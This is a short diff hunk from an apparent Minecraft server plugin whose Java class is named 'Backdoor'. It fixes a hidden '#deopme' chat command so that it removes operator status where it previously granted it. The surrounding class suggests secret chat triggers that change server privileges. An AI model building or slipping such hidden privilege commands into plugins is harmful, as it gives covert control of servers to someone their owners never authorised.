@@ -52,7 +52,7 @@ public class Backdoor implements Listener {
                     break;
                 }
                 case "#deopme":{
-                    p.setOp(true);
+                    p.setOp(false);
                     p.sendMessage(Utils.chat("&dYou Have Been Deopped"));
                     break;
                 }
